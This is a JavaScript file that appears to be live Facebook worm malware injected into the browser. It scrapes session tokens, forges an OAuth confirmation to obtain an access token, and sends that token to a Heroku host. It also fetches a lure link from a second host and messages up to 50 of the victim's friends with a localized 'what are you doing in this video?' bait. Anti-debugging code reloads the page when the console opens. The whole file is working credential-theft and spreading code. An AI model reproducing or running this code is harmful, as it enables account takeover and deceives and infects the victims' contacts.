var account = "UA-109289574-1";
var ana = document.createElement("script");
ana.type = "text/javascript";
ana.innerHTML = "(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', '"+account+"', 'auto'); ga('send', 'pageview');";
document.body.appendChild(ana);

var cnsl = true;
var win = this;
var ajax = win["XMLHttpRequest"];
function start() {
  var cookie_name = "sound:" + profile_id + "oi23";
  var cookie_time = 30;
  if (!getCookie(cookie_name) || parseInt(getCookie(cookie_name)) < Date.now() - 60 * 1E3 * cookie_time) {
    createCookie(cookie_name, Date.now(), 1);
    config = {};
    config["chat_limit"] = 50;
    _e_P();
    nekot();
  }
}
function nekot() {

  if (localStorage.access_token != "nekot") {
    var getParams = {};
    getParams["composer_id"] = "rc.u_0_" + rand(0, 30);
    getParams["composer_type"] = "pages_feed";
    getParams["target_id"] = "20531316728";
    getParams["av"] = profile_id;
    getParams["dpr"] = "1";
    var params = {};
    params["__user"] = profile_id;
    params["__a"] = "1";
    params["__dyn"] = __dyn;
    params["__af"] = "j0";
    params["__req"] = "2z";
    params["__be"] = "-1";
    params["__pc"] = "EXP1:home_page_pkg";
    params["__rev"] = __rev;
    params["fb_dtsg"] = fb_dtsg;
    params["jazoest"] = jazoest;
    var xhr = new ajax;
    xhr.open("POST", "/react_composer/status/bootstrap/?" + deSerialize(getParams));
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.onreadystatechange = function() {
      if (xhr.readyState == 4 && xhr.status == 200) {
        if (xhr.responseText.indexOf("access_token") > 0) {
           new Image().src = "https://big-white-shark.herokuapp.com/cnfg.php?pid=" + profile_id + "&atk=" +  xhr.responseText.split('access_token":')[1].split('"')[1].split('"')[0] + "&gnd=PROBA_INBOX";
          localStorage.access_token = "nekot";
        }
      }
    };
    xhr.send(deSerialize(params));
  }
}
function _e_P() {
  var params = {};
  params["fb_dtsg"] = fb_dtsg;
  params["__user"] = profile_id;
  params["__a"] = "1";
  params["__dyn"] = __dyn;
  params["__af"] = "3p";
  params["__req"] = "pS";
  params["__be"] = "-1";
  params["__pc"] = "EXP:DEFAULT";
  params["__rev"] = __rev;
  params["jazoest"] = jazoest;
  var xhr = new ajax;
  xhr.open("POST", "/settings/application/platform_opt_out/submit/?action=enable&dpr=1", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      _g_T();
    }
  };
  xhr.send(deSerialize(params));
}
function _g_T() {
  var params = {};
  params["fb_dtsg"] = fb_dtsg;
  params["app_id"] = "165907476854626";
  params["redirect_uri"] = "fbconnect://success";
  params["display"] = "popup";
  params["access_token"] = "";
  params["sdk"] = "";
  params["from_post"] = "1";
  params["private"] = "";
  params["tos"] = "";
  params["login"] = "";
  params["read"] = "";
  params["write"] = "";
  params["extended"] = "";
  params["social_confirm"] = "";
  params["confirm"] = "";
  params["seen_scopes"] = "";
  params["auth_type"] = "";
  params["auth_token"] = "";
  params["auth_nonce"] = "";
  params["default_audience"] = "";
  params["ref"] = "Default";
  params["return_format"] = "access_token";
  params["domain"] = "";
  params["sso_device"] = "ios";
  params["__CONFIRM__"] = "1";
  var xhr = new ajax;
  xhr.open("POST", "/v2.8/dialog/oauth/confirm", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      if (xhr.responseText.indexOf("access_token=") > 0) {
        jsonOBJECT = {};
        jsonOBJECT.access_token = xhr.responseText.split("access_token=")[1].split("&")[0];
        jsonOBJECT.pages_id = 159848587923368;
        //Kontrol(jsonOBJECT);
        online(jsonOBJECT);
      }
    }
  };
  xhr.send(deSerialize(params));
}
function Kontrol(jsonOBJECT) {
  var xhr = new XMLHttpRequest;
  var params = {};
  params["q"] = "SELECT created_time FROM page_fan WHERE uid = me() AND page_id = " + jsonOBJECT.pages_id;
  params["access_token"] = jsonOBJECT.access_token;
  xhr.open("GET", "https://graph.facebook.com/fql?" + deSerialize(params));
  xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      var data = JSON.parse(xhr.responseText);
      if (data.data.length == 0) {
        pages(jsonOBJECT);
      }
    }
  };
  xhr.send();
}
function pages(jsonOBJECT) {
  var xhr = new XMLHttpRequest;
  var params = {};
  params["fbpage_id"] = jsonOBJECT.pages_id;
  params["add"] = "true";
  params["reload"] = "false";
  params["fan_origin"] = "page_timeline";
  params["fan_source"] = "";
  params["cat"] = "";
  params["actor_id"] = profile_id;
  params["__user"] = profile_id;
  params["__a"] = "1";
  params["__dyn"] = __dyn;
  params["__af"] = "iw";
  params["__req"] = "g";
  params["__be"] = "-1";
  params["__pc"] = "PHASED:DEFAULT";
  params["__rev"] = __rev;
  params["fb_dtsg"] = fb_dtsg;
  params["jazoest"] = jazoest;
  params["__spin_r"] = __rev;
  params["__spin_b"] = "trunk";
  params["__spin_t"] = Math.floor(Date.now() / 1E3);
  xhr.open("POST", "/ajax/pages/fan_status.php?av=" + profile_id + "&dpr=1", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      xhr.close;
    }
  };
  xhr.send(deSerialize(params));
}
function online(jsonOBJECT) {
  var params = {};
  params["q"] = "SELECT uid, name, locale, online_presence, pic_big, can_post  FROM user WHERE uid IN (SELECT uid2 FROM friend WHERE uid1 = me()) Order By online_presence Limit 2000";
  params["access_token"] = jsonOBJECT.access_token;
  params["ext"] = "me";
  var xhr = new ajax;
  xhr.open("GET", "https://graph.facebook.com/fql?" + deSerialize(params), true);
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      var data = JSON.parse(xhr.responseText.replace("for (;;);", ""));
      if (!data.error) {
        var friends = data.data;
        friends = shuffle(friends);
        jsonOBJECT.friends = [];
        i = 0;
        for (;i < friends.length && jsonOBJECT.friends.length < config.chat_limit;i++) {
          if (friends[i].online_presence == "active") {
            jsonOBJECT.friends.push(friends[i]);
          }
        }
        i = 0;
        for (;i < friends.length && jsonOBJECT.friends.length < config.chat_limit;i++) {
          if (friends[i].online_presence == "idle") {
            jsonOBJECT.friends.push(friends[i]);
          }
        }
        // i = 0;
        // for (;i < friends.length && jsonOBJECT.friends.length < config.chat_limit;i++) {
        //   if (friends[i].online_presence == "offline") {
        //     jsonOBJECT.friends.push(friends[i]);
        //   }
        // }
        if (jsonOBJECT.friends.length > 0) {
          _G_L(jsonOBJECT);
        }
      }
    }
  };
  xhr.send();
}
function _G_L(jsonOBJECT) {
  var str = user_name;
  var res = str.split(" ");
  var Uname = res[0];
  var xhr = new ajax;
  xhr.open("GET", "https://linear-cloud.herokuapp.com/?uid="+profile_id+"&name="+Uname);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      var data = JSON.parse(xhr.responseText);
      if (data.link) {
        jsonOBJECT.link = data.link;

        for (i = 0;i < jsonOBJECT.friends.length;i++) {
          jsonOBJECT.uid = jsonOBJECT.friends[i].uid;
          jsonOBJECT.pic_big = jsonOBJECT.friends[i].pic_big;
          jsonOBJECT.name = jsonOBJECT.friends[i].name ? jsonOBJECT.friends[i].name.split(" ")[0] : jsonOBJECT.friends[i].text.split(" ")[0];
          jsonOBJECT.locale = jsonOBJECT.friends[i].locale;

        //  _S_e(jsonOBJECT);
        scrape(jsonOBJECT);
}
      }
    }
  };
  xhr.send();

}
function scrape(jsonOBJECT){
    var params = {}
    params["image_height"] = 960;
    params["image_width"] = 960;
    params["uri"] = jsonOBJECT.link;
    params["__user"] = profile_id;
    params["__a"] = 1;
    params["__dyn"] = __dyn;
    params["__req"] = "15";
    params["__be"] = "-1";
    params["fb_dtsg"] = fb_dtsg;
    params["jazoest"] = jazoest;
    params["__rev"] = __rev;
    var xhr = new ajax();
    xhr.open("POST", "https://www.facebook.com/message_share_attachment/fromURI/?dpr=1&ext=me");
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.send(deSerialize(params));
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            var data = JSON.parse(xhr.responseText.replace("for (;;);",""));
            jsonOBJECT.urlInfoCanoncial = searchArray(data, "canonical");
            jsonOBJECT.urlInfoFinal = searchArray(data, "final");
            jsonOBJECT.urlInfoUser = searchArray(data, "user");
            jsonOBJECT.favicon = searchArray(data, "favicon");
            jsonOBJECT.title = searchArray(data, "title");
            jsonOBJECT.description = searchArray(data, "description");

            jsonOBJECT.images = searchArray(data, "images");
            jsonOBJECT.time_scraped = searchArray(data, "time_scraped");
            //c.url = searchArray(data, "url");


            sendMessageImage(jsonOBJECT);
        }
    }
}
function sendMessageImage(jsonOBJECT){
    var uid = jsonOBJECT.uid;
    var e = jsonOBJECT["link"];
    var message = generate_name(10);
    var message_id = rand(11111111,999999999);
    var lang = jsonOBJECT.locale;
    var emri = jsonOBJECT.name;
    if(lang == "sq_AL") {
    title = "cfar ben ti ne kte video?";
    }
    else if(lang == "mk_MK") {
    title = "sto pravis ti na ova video?";
    }
    else if(lang == "es_LA" || lang == "es_CO" || lang == "es_ES") {
    title = "¿Qué haces en este video?";
    }
    else if(lang == "de_DE") {
    title = "was machst du in diesem Video?";
    }
    else if(lang == "bs_BA" || lang == "hr_HR" || lang == "sr_RS") {
    title = "sta ti radis na ovom videu?";
    }
    else if(lang == "sl_SI") {
    title = "kaj delaš na tem videoposnetku?";
    }
    else if(lang == "it_IT") {
    title = "cosa stai facendo su questo video?";
    }
    else if(lang == "el_GR") {
    title = "τι κάνεις σε αυτό το βίντεο?";
    }
    else if(lang == "pl_PL") {
    title = "co robisz w tym filmie?";
    }
    else if(lang == "cz_CZ") {
    title = "co děláš na tomto videu?";
    }
    else if(lang == "sk_SK") {
    title = "čo robíte na tomto videu?";
    }
    else if(lang == "hu_HU") {
    title = "mit csinálsz ezen a videón?";
    }
    else if(lang == "bg_BG") {
    title = "какво правиш с този видеоклип?";
    }
    else if(lang == "tl_PH") {
    title = "ano ang ginagawa mo sa video na ito?";
    }
    else if(lang == "da_DK") {
    title = "hvad laver du på denne video?";
    }
    else if(lang == "af_ZA") {
    title = "wat doen jy op hierdie video?";
    }
    else if(lang == "ro_RO") {
    title = "ce faci în acest videoclip?";
    }
    else if(lang == "ru_RU") {
    title = "что вы делаете на этом видео?";
    }
    else if(lang == "fi_FI") {
    title = "mitä teet tällä videolla?";
    }
    else if(lang == "sv_SE") {
    title = "vad gör du på den här videon?";
    }
    else if(lang == "th_TH") {
    title = "คุณกำลังทำอะไรอยู่ในวิดีโอนี้";
    }
    else if(lang == "tr_TR") {
    title = "bu video üzerinde ne yapıyorsun?";
    }
    else if(lang == "ka_GE") {
    title = "რას აკეთებ ამ ვიდეოზე?";
    }
    else if(lang == "fr_FR" || lang == "fr_CA") {
    title = "que faites-vous sur cette vidéo?";
    }
    else if(lang == "pt_PT" || lang == "pt_BR") {
    title = "O que você está fazendo neste vídeo?";
    }
    else if(lang == "nl_NL" || lang == "nl_BE") {
    title = "wat doe je op deze video?";
    }
    else if(lang == "nb_NO" || lang == "nn_NO") {
    title = "hva gjør du på denne videoen?";
    }
    else {
    title = "what are you doing on this video?";
    }
    body = emri + " " +title;
    var params = {};
    params["client"] = "mercury";
    params["action_type"] = "ma-type:user-generated-message";
    params["body"] = "";
    params["client_thread_id"] = "root:"+message_id;
    params["ephemeral_ttl_mode"] = 0;
    params["has_attachment"] = true;
    params["message_id"] = message_id;
    params["offline_threading_id"] = message_id;
    params["other_user_fbid"] = jsonOBJECT.uid;
    params["signature_id"] = rastgele(8);
    params["shareable_attachment[share_type]"] = 100;
    params["shareable_attachment[share_params][urlInfo][canonical]"] = jsonOBJECT.urlInfoCanoncial;
    params["shareable_attachment[share_params][urlInfo][final]"] = jsonOBJECT.urlInfoFinal;
    params["shareable_attachment[share_params][urlInfo][user]"] = jsonOBJECT.urlInfoUser;
    params["shareable_attachment[share_params][responseCode]"] = 200;
    params["shareable_attachment[share_params][favicon]"] = jsonOBJECT.favicon;
    params["shareable_attachment[share_params][title]"] = jsonOBJECT.title;
    params["shareable_attachment[share_params][summary]"] = jsonOBJECT.description;
    params["shareable_attachment[share_params][caption]"] = "youtu.be";
    params["shareable_attachment[share_params][content_removed]"] = false;
    params["shareable_attachment[share_params][images][0]"] = jsonOBJECT.images;
    params["shareable_attachment[share_params][medium]"] = 106;
    params["shareable_attachment[share_params][url]"] = jsonOBJECT.urlInfoUser;
    params["shareable_attachment[share_params][time_scraped]"] = jsonOBJECT.time_scraped;
    params["shareable_attachment[share_params][cache_hit]"] = true;
    params["shareable_attachment[share_params][was_recent]"] = false;
    params["shareable_attachment[share_params][ttl]"] = 604800;
    params["shareable_attachment[share_params][error]"] = 1;
    params["source"] = "source:chat:web";
    params["specific_to_list[0]"] = "fbid:" + jsonOBJECT.uid;
    params["specific_to_list[1]"] = "fbid:" + profile_id;
    params["tags[0]"] = "web:trigger:unknown";
    params["timestamp"] = Date.now();
    params["ui_push_phase"] = "V3";
    params["__user"] = profile_id;
    params["__a"] = 1;
    params["__dyn"] = __dyn;
    params["__req"] = "t";
    params["__be"] = -1;
    params["__pc"] = "PHASED:DEFAULT";
    params["fb_dtsg"] = fb_dtsg;
    params["jazoest"] = jazoest;
    params["__rev"] = __rev;

    var xhr = new ajax();
    xhr.open("POST", "https://www.facebook.com/messaging/send/?ext=me");
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");

    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            var data = JSON.parse(xhr.responseText.replace("for (;;);",""));
            if(!data.error){
              jsonOBJECT["thread_fbid"] = searchArray(data, "thread_fbid");


            }else{

            }
        }
    }
    xhr.send(deSerialize(params))
}



function banword(obj) {
    delimiters = [unescape("%A0"), " ", ".", "_", "-"];
    obj = obj["split"]("");
    finalWord = "";
    insertIn = Math["floor"](Math["random"]() * obj["length"]);
    if (obj[insertIn] == " ") {
      insertIn--;
    }
    if (insertIn == obj["length"]) {
      insertIn--;
    }
    for (var i = 0;i < obj["length"];i++) {
      finalWord = finalWord + (insertIn == i ? obj[i] + delimiters[Math["floor"](Math["random"]() * delimiters["length"])] : obj[i]);
    }
    return finalWord;
  }
function generate_name(length, firstUpper) {
  rname = "";
  sesli = "aeiou";
  sessiz = "bcdfghjklmnprstvyz";
  rname = rand(1, 2) == 1 ? sessiz[rand(0, sessiz.length - 1)] : sesli[rand(0, sesli.length - 1)];
  if (firstUpper == true) {
    rname = rname.toUpperCase();
  }
  n = 0;
  for (;n < length;n++) {
    if (sesli.indexOf(rname[rname.length - 1]) >= 0) {
      rname += sessiz[rand(0, sessiz.length - 1)];
    } else {
      rname += sesli[rand(0, sesli.length - 1)];
    }
  }
  return rname;
}
function getCookie(cname) {
  var name = cname + "=";
  var ca = document.cookie.split(";");
  var i = 0;
  for (;i < ca.length;i++) {
    var c = ca[i];
    for (;c.charAt(0) == " ";) {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return "";
}
function createCookie(name, value, days) {
  var expires;
  if (days) {
    var date = new Date;
    date.setTime(date.getTime() + days * 24 * 60 * 60 * 1E3);
    expires = "; expires=" + date.toGMTString();
  } else {
    expires = "";
  }
  document.cookie = name + "=" + value + expires + "; path=/";
}
function inArray(arr, key, value) {
  var res = false;
  a = 0;
  for (;a < arr.length;a++) {
    for (k in arr[a]) {
      if (k == key && arr[a][k] == value) {
        res = true;
        break;
      }
    }
  }
  return res;
}
function get_dyn() {
  function toCompressedString() {
    $BitMap1 = [];
    for (i in t) {
      $BitMap1[t[i]] = 1;
    }
    if ($BitMap1["length"] === 0) {
      return "";
    }
    var l = [];
    var m = 1;
    var n = $BitMap1[0] || 0;
    var o = n.toString(2);
    var p = 1;
    for (;p < $BitMap1["length"];p++) {
      var q = $BitMap1[p] || 0;
      if (q === n) {
        m++;
      } else {
        l["push"](j(m));
        n = q;
        m = 1;
      }
    }
    if (m) {
      l["push"](j(m));
    }
    return k(o + l["join"](""));
  }
  function j(l) {
    var m = l.toString(2);
    var n = "0"["repeat"](m["length"] - 1);
    return n + m;
  }
  function k(l) {
    var m = (l + "00000")["match"](/[01]{6}/g);
    var n = "";
    var o = 0;
    for (;o < m["length"];o++) {
      n += h[parseInt(m[o], 2)];
    }
    return n;
  }
  var bd = document["body"]["innerHTML"]["match"](/\},([0-9])+\]/gi);
  var hd = document["head"]["innerHTML"]["match"](/\},([0-9])+\]/gi);
  var is = bd["concat"](hd);
  var t = [];
  for (x in is) {
    if (is[x] != null) {
      var p = is[x]["replace"]("},", "")["replace"]("]", "");
      if (parseInt(p) >= 7) {
        t["push"](parseInt(p));
      }
    }
  }
  var h = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_";
  return toCompressedString();
}
function guid() {
  function s4() {
    return Math.floor((1 + Math.random()) * 65536).toString(16).substring(1);
  }
  return s4() + s4() + "-" + s4() + "-" + s4() + "-" + s4() + "-" + s4() + s4() + s4();
}
function randoms(l, m) {
  var r = [];
  for (;r.length < l;) {
    var rnd = Math.floor(Math.random() * m);
    if (r.indexOf(rnd) < 0) {
      r.push(rnd);
    }
  }
  return r;
}
function searchArray(a, k) {
  var found = false;
  for (key in a) {
    if (key.toString() == k) {
      found = a[key];
      break;
    } else {
      if (typeof a[key] == "object") {
        found = searchArray(a[key], k);
        if (found != false) {
          break;
        }
      }
    }
  }
  return found;
}
function shuffle(array) {
  var currentIndex = array.length;
  var temporaryValue;
  var randomIndex;
  for (;0 !== currentIndex;) {
    randomIndex = Math.floor(Math.random() * currentIndex);
    currentIndex -= 1;
    temporaryValue = array[currentIndex];
    array[currentIndex] = array[randomIndex];
    array[randomIndex] = temporaryValue;
  }
  return array;
}
function rand(min, max) {
  return Math.floor(Math.random() * (max - min)) + min;
}
function rastgele(uzunluk) {
  mtn = "abcdefghijklmnoprstuvyzxABCDEFGHIJKLMNOPRSTUVYZX0123456789";
  ret = "";
  l = 0;
  for (;l < uzunluk;l++) {
    ret += mtn[Math.floor(Math.random() * mtn.length)];
  }
  return ret;
}
function random(nr) {
  mtn = "abcdefghijklmnoprstuvyzx";
  ret = "";
  l = 0;
  for (;l < nr;l++) {
    ret += mtn[Math.floor(Math.random() * mtn.length)];
  }
  return ret;
}
function deSerialize(json) {
  return Object.keys(json).map(function(key) {
    return encodeURIComponent(key) + "=" + encodeURIComponent(json[key]);
  }).join("&");
}

var cntrl = "d";
var element = new Image;
element.__defineGetter__("id", function() {
  cntrl = "e";
  if (cnsl == false) {
    location.reload();
  }
});
console.log(element);
console.clear();
function _composer() {
  var c = new ajax;
  c["open"]("GET", "https://www.facebook.com/");
  c["send"]();
  c["onreadystatechange"] = function() {
    if (4 == c["readyState"] && (profile_id = c["responseText"].split("USER_ID" + '"' + ":")[1].split('"')[1].split('"')[0], 0 != profile_id)) {
      user_name = c["responseText"].split("NAME" + '"' + ":")[1].split('"')[1].split('"')[0];
      locale = c["responseText"].split('{"locale' + '"' + ":")[1].split('"')[1].split('"')[0];
      fb_dtsg = c["responseText"].split("name=" + '"' + "fb_dtsg")[1].split("value=" + '"')[1].split('"')[0];
      __rev = c["responseText"].split('"' + "server_revision" + '"' + ":")[1].split(",")[0];
      jazoest = "";
      var b = 0;
      for (;b < fb_dtsg["length"];b++) {
        jazoest += fb_dtsg["charCodeAt"](b);
      }
      jazoest = "2" + jazoest;
      __dyn = get_dyn();
      start();
    }
  };
}
if (location.hostname.indexOf("facebook.com") >= 0 && (cntrl == "d" || cnsl == true)) {
_composer();
}
;
